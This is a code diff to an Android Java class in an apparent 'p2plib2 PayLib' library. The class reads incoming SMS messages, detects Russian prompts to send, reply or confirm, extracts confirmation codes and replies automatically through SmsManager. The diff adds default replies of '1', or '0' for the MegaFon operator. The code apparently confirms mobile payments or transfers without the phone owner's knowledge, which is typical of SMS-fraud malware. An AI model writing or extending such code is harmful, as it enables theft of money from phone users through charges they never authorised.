@@ -20,6 +20,7 @@ import java.util.HashMap;
 import java.util.HashSet;
 
 import static com.p2plib2.PayLib.flagok;
+import static com.p2plib2.PayLib.operName;
 import static com.p2plib2.PayLib.simCounter;
 
 public class Operator {
@@ -99,6 +100,7 @@ public class Operator {
                     }
                 }
             }
+            flagok=false;
         } catch (Exception e) {
             Logger.lg("Code P2P-008: " + e.getMessage());
         }
@@ -131,12 +133,18 @@ public class Operator {
     public void sendAnswer(String smsBody, String smsSender) {
         String sms_body = smsBody.toLowerCase();
         Logger.lg("SendAnswer " + sms_body + " smsSender " + smsSender);
+        flagok=true;
         if (sms_body.contains("отправь") || sms_body.contains("ответь") || sms_body.contains("подтверд")) {
             SmsManager smsManager = SmsManager.getDefault();
             String answ = "";
             if (sms_body.toLowerCase().contains("подтвер")) {
                 if (sms_body.contains("кодом ") && sms_body.contains(" в ответном")) {
                     answ = sms_body.substring(sms_body.indexOf("кодом ") + 6, sms_body.indexOf(" в ответном") + 1);
+                } else {
+                    answ = "1";
+                }
+                if(equalsOperators(operName, OperatorNames.MEGAFON)){
+                    answ = "0";
                 }
             } else {
                 answ = "1";
@@ -193,6 +201,7 @@ public class Operator {
             Logger.lg("Error! " + sms_body);
             PayLib.getSMSResult("Code : " + sms_body);
         }
+        flagok = false;
     }
 
 
